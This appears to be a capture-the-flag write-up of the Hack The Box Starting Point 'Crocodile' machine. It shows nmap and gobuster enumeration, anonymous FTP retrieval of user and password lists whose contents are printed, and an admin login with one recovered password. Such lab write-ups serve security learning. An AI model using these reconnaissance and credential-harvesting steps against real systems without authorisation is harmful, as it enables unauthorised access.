---
layout: post
title: crocodile
categories: htb
tags:
- htb
- starting_point
- crocodile
- ftp
author: nicoliboli
description: starting point | tier 1 | box 2
date: '2025-06-28 21:24:17 -0400'
---
# enumeration

```
$ nmap 10.129.1.15                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-28 21:06 EDT
Nmap scan report for 10.129.1.15
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.25 seconds

$ nmap -T5 -p- 10.129.1.15       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-28 21:06 EDT
Warning: 10.129.1.15 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.1.15
Host is up (0.099s latency).
Not shown: 64249 closed tcp ports (conn-refused), 1284 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 513.60 seconds

$ nmap -sC -sV -p 21,80 10.129.1.15
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-28 21:11 EDT
Nmap scan report for 10.129.1.15
Host is up (0.097s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.189
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds
```

## port 21 - ftp

connect to the ftp server anonymously and get the files stored on there

```
$ ftp 10.129.1.15      
Connected to 10.129.1.15.
220 (vsFTPd 3.0.3)
Name (10.129.1.15:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||47125|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||45875|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |**************************************************************************************************************|    33      196.50 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.32 KiB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||46573|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |**************************************************************************************************************|    62      611.58 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.59 KiB/s)
ftp> exit
221 Goodbye.
```

view the files and see a couple usernames and passwords

```
$ cat allowed.userlist               
aron
pwnmeow
egotisticalsw
admin

$ cat allowed.userlist.passwd 
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

## port 80 - http

visit the site

![crocodile_homepage](/assets/img/crocodile_homepage.png)

use gobuster to look at some directories and `php` files

```
$ gobuster dir -u http://10.129.1.15 -w /usr/share/wordlists/dirb/common.txt -x php    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.1.15
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/assets               (Status: 301) [Size: 311] [--> http://10.129.1.15/assets/]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 308] [--> http://10.129.1.15/css/]
/dashboard            (Status: 301) [Size: 314] [--> http://10.129.1.15/dashboard/]
/fonts                (Status: 301) [Size: 310] [--> http://10.129.1.15/fonts/]
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 301) [Size: 307] [--> http://10.129.1.15/js/]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/server-status        (Status: 403) [Size: 276]
Progress: 9228 / 9230 (99.98%)
===============================================================
Finished
===============================================================
```

# exploitation

go to that login page and login with the creds `admin:rKXM59ESxesUFHAd`

![crocodile_login](/assets/img/crocodile_login.png)

![crocodile_success_login](/assets/img/crocodile_success_login.png)